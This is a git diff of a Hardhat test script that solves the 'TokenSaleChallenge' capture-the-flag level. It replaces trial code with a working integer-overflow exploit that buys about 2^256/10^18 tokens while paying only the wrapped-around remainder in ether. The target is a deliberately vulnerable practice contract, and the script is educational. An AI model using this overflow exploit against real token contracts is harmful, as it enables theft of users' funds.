@@ -14,127 +14,51 @@ before(async () => {
     "TokenSaleChallenge"
   );
   challengeContract = challengeFactory.attach(
-    `0xe8A4E7F02498432a41D60DBdB65394286e2003B1`
+    `0x56E9615787Fde82f3C68b572f68e2bC6C1866918`
   );
 });
 
-it("solves the challenge", async function () {
+it("solves the challenge", async () => {
 
   // decimals not accepted in bn.js library... so we should find a workaround
-  // const decimalValue = BigNumber.from(10.10)
-  // console.log("decimalValue : " + decimalValue)
   
+  // we need to find 2^256 / 10^18 * 10^18 % 2^256 = a value close to 0
+  // actually we can find a value = 0
+  // since dividend = quotient * divisor + remainder
+  // => we can calculate the right side of the formula and pass in as a argument to buy tokens
 
-  const twoPow256 = BigNumber.from(`2`).pow(`256`)
+  
+  const _2_POW_256 = BigNumber.from(`2`).pow(`256`)
   const ONE_ETHER = BigNumber.from(`10`).pow(`18`)
+  const quotient = _2_POW_256.div(ONE_ETHER)
+  const remainder = _2_POW_256.mod(ONE_ETHER)
 
-  const beforeModn0 = twoPow256.add(ONE_ETHER).div(ONE_ETHER).mul(ONE_ETHER)
-  const beforeModn1 = twoPow256.add(ONE_ETHER).sub(BigNumber.from(`415992086870360064`)).div(ONE_ETHER).mul(ONE_ETHER)
-  const beforeModn2 = twoPow256.add(ONE_ETHER.mul(2)).div(ONE_ETHER).mul(ONE_ETHER)
+  const overflowAmount = quotient.add(1).mul(ONE_ETHER).mod(_2_POW_256)
 
-  console.log("before mod : " + beforeModn1)
+  expect(overflowAmount).be.lt(ONE_ETHER)
+  
+  console.log("quotient part : " + quotient)
+  console.log("remainder part : " + remainder)
+  console.log("1 ether - reminder : " + ONE_ETHER.sub(remainder))
+  console.log("overflowed         : " + overflowAmount)
 
-  const afterModn0 = beforeModn0.mod(twoPow256)
-  const afterModn1 = beforeModn1.mod(twoPow256)
-  const afterModn2 = beforeModn2.mod(twoPow256)
-
-  console.log("after mod : " + afterModn0)
-  console.log("after mod : " + afterModn1)
-  console.log("after mod : " + afterModn2)
-
+  const tokensToBuy = quotient.add(1)
   
 
-  // const toBuy = twoPow256.add(ONE_ETHER).div(ONE_ETHER)
+  const buyTx = await challengeContract.buy(tokensToBuy, {
+    value: ONE_ETHER.sub(remainder),
+  });
 
-  // const overflowValue = BigNumber.from(`2`).pow(`256`)  
-  // console.log("over : " + overflowValue)
-  // console.log("over : " + overflowValue.add(100))
-  // console.log("over : " + overflowValue.add(200))
-  // console.log("over : " + overflowValue)
-  // console.log("over : " + overflowValue)
-
-
+  console.log(`hash`, buyTx.hash)
+  await buyTx.wait();
   
-  // const exactValue = BigNumber.from(`2`).pow(`256`).div(ONE_ETHER)
-  // const absValue = BigNumber.from(`2`).pow(`256`).div(ONE_ETHER).abs()
-  
-  // console.log("diff : " + overflowValue.sub(exactValue))
-
-  // console.log("part : " + overflowValue.div(ONE_ETHER).mul(ONE_ETHER))
-
-  // console.log("tota : " + overflowValue.div(ONE_ETHER).add(1).mul(ONE_ETHER).mod(overflowValue))
-  // console.log("tota : " + overflowValue.add(100).div(ONE_ETHER).add(1).mul(ONE_ETHER).mod(overflowValue))
-  // console.log("tota : " + overflowValue.add(200).div(ONE_ETHER).add(1).mul(ONE_ETHER).mod(overflowValue))
-  // console.log("tota : " + overflowValue.add(300).div(ONE_ETHER).add(1).mul(ONE_ETHER).mod(overflowValue))
-  // console.log("tota : " + overflowValue.add(400).div(ONE_ETHER).add(1).mul(ONE_ETHER).mod(overflowValue))
-  // console.log("tota : " + overflowValue.add(500).div(ONE_ETHER).add(1).mul(ONE_ETHER).mod(overflowValue))
-  // console.log("tota : " + overflowValue.add(50000).div(ONE_ETHER).add(1).mul(ONE_ETHER).mod(overflowValue))
-
-
-// BigNumber.prototype.
-  // console.log("exact : " + exactValue.)
-  // console.log("exact : " + exactValue)
-  // console.log("abs : " + absValue)
-
-  // const calcDiv = exactValue.div(ONE_ETHER)
-  // console.log("calc div :" + calcDiv)
-
-
-  // const calcMod = calcDiv.mod(overflowValue)
-
-  // console.log("mod : " + calcMod)
-  //   await challengeContract.buy(bestPair.toBuy.toString(), {
-  //   value: bestPair.toPay.toString(),
-  // });
-  // // we want an overflow in this line of the contract:
-  // // uint256 = numTokens * 1 ether = numTokens * 10 ^ 18
-  // // when x is the amount of tokens we will receive (input to buy)
-  // // then we need to pay ceil(x / 10^18) * 10^18 mod 2^256 (overflow amount) in value
-  // // try to minimize this payment value for x >= 2^256 (when overflow happens)
-  // // not sure how to do it analytically, but we can just start with x = 2^256
-  // // as 2^256 and 10^18 = (2*5)^18 = 2^18*5^18, multiplying by prime 3 should
-  // // give us a good cycle to check for min value
-  // const ONE_ETHER = BigNumber.from(`10`).pow(`18`);
-  // const computePayment = (x: BigNumber) => {
-  //   // there's a remainder that is cut off, need to increase division result by 1
-  //   let toBuy = x.div(ONE_ETHER).add(`1`);
-  //   let overflowRemainder = toBuy
-  //     .mul(ONE_ETHER)
-  //     .mod(BigNumber.from(`2`).pow(`256`));
-  //   return { toBuy, toPay: overflowRemainder };
-  // };
-  // let MAX_UINT256 = BigNumber.from(`2`).pow(`256`);
-  // let multiplier = BigNumber.from(`3`)
-  // let bestPair: ReturnType<typeof computePayment> = {
-  //   toBuy: BigNumber.from(`0`),
-  //   toPay: BigNumber.from(ethers.utils.parseEther(`1`)),
-  // };
-
-  // // make sure toBuy = x / ONE_ETHER
-  // while(true) {
-  //   multiplier = multiplier.mul(`3`);
-  //   const result = computePayment(MAX_UINT256.mul(multiplier))
-
-  //   // make sure to buy still fits in uint256 for function call
-  //   if(result.toBuy.gte(MAX_UINT256)) break;
-
-  //   if(result.toPay.lt(bestPair.toPay)) {
-  //     bestPair = result
-  //   }
-  // }
-
-  // console.log(`buying`, bestPair.toBuy.toString());
-  // console.log(`paying`, ethers.utils.formatEther(bestPair.toPay), `ETH`);
-
-  // await challengeContract.buy(bestPair.toBuy.toString(), {
-  //   value: bestPair.toPay.toString(),
-  // });
-
   // const balance: BigNumber = await challengeContract.balanceOf(await eoa.getAddress());
   // console.log(`balance`, balance.toString());
 
-  // const tx = await challengeContract.sell(`1`);
+  // const sellTx = await challengeContract.sell(`1`);
+  // await sellTx.wait();
 
   // const isComplete = await challengeContract.isComplete();
   // expect(isComplete).to.be.true;
+
 });
